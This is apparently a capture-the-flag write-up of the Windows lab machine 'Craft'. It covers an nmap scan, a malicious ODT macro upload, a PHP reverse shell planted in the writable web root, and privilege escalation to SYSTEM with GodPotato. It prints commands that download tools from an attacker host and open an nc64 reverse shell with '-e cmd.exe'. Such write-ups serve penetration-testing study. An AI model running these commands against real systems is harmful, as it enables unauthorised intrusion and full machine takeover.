---
icon: windows
---

# Craft - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 192.168.214.169 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 11:23 EDT
Nmap scan report for 192.168.214.169
Host is up (0.029s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Craft
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   32.07 ms 192.168.45.1
2   31.23 ms 192.168.45.254
3   31.40 ms 192.168.251.1
4   32.06 ms 192.168.214.169
```

### HTTP Port 80 TCP

<figure><img src="../../.gitbook/assets/image (1314).png" alt=""><figcaption></figcaption></figure>

There is upload functionality at the bottom of the page.&#x20;

<figure><img src="../../.gitbook/assets/image (1315).png" alt=""><figcaption></figcaption></figure>

It only accepts ODT files! I assume someone is going to be checking the file. I am going to generate a malicious odt file using [**mmg-odt.py**](https://github.com/0bfxgh0st/MMG-LO)

### <mark style="color:$primary;">**File Upload Malicous ODT File**</mark>

```
python3 ~/tools/macros/Libre_Office/MMG-LO/mmg-odt.py windows 192.168.45.158 80
```

<figure><img src="../../.gitbook/assets/image (1316).png" alt=""><figcaption></figcaption></figure>

make sure to setup a listener before uploading!

<figure><img src="../../.gitbook/assets/image (1317).png" alt=""><figcaption></figcaption></figure>

After uploading the file we get this, and if you wait a bit you'll get a reverse shell

<figure><img src="../../.gitbook/assets/image (1318).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1319).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Winpeas</mark>

<figure><img src="../../.gitbook/assets/image (1320).png" alt=""><figcaption></figcaption></figure>

Apache comes up along with a generically named service. Could be useful if we can get the ability to stop/start services and can replace the service binary.

### <mark style="color:$primary;">Write Access to Xammp\htdocs</mark>

I realized I have writable access to C:\xampp\htdocs.

```
powershell Get-Acl C:\xampp\htdocs\logs | fl
```

<figure><img src="../../.gitbook/assets/image (1321).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1322).png" alt=""><figcaption></figcaption></figure>

This is the root of the web server! There’s our index and upload PHP files. That means this directory is browsable from the outside. Good to know. Let’s create a PHP reverse shell and verify that PHP execution is performed by apache.

<figure><img src="../../.gitbook/assets/image (1324).png" alt=""><figcaption></figcaption></figure>

I'll save this to reverse.php and upload it to xampp\htdocs than visit the webpage from the outside

<figure><img src="../../.gitbook/assets/image (1325).png" alt=""><figcaption></figcaption></figure>

make sure you have a listener ready before accessing reverse.php

<figure><img src="../../.gitbook/assets/image (1326).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1327).png" alt=""><figcaption></figcaption></figure>

Nice we got a shell as apache! And we got SeImpersonatePrivilege let's impersonate the admin user!

### <mark style="color:$primary;">SeImpersonatePrivilege</mark>

I am going to user [**godpotato**](https://github.com/BeichenDream/GodPotato/releases) to privesc

```
iwr -uri http://192.168.45.158/GodPotato-NET4.exe -outfile GodPotato-NET4.exe
```

```
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

<figure><img src="../../.gitbook/assets/image (1328).png" alt=""><figcaption></figcaption></figure>

We have NT Authority\System, I am going to upload nc64.exe to the machine and get a shell as admin!

```
iwr -uri http://192.168.45.158/nc64.exe -outfile nc64.exe
```

```
.\GodPotato-NET4.exe -cmd "c:/users/apache/nc64 192.168.45.158 80 -e cmd.exe"
```

<figure><img src="../../.gitbook/assets/image (1329).png" alt=""><figcaption></figcaption></figure>

the whoami command does not work properly but we are admin

<figure><img src="../../.gitbook/assets/image (1331).png" alt=""><figcaption></figcaption></figure>
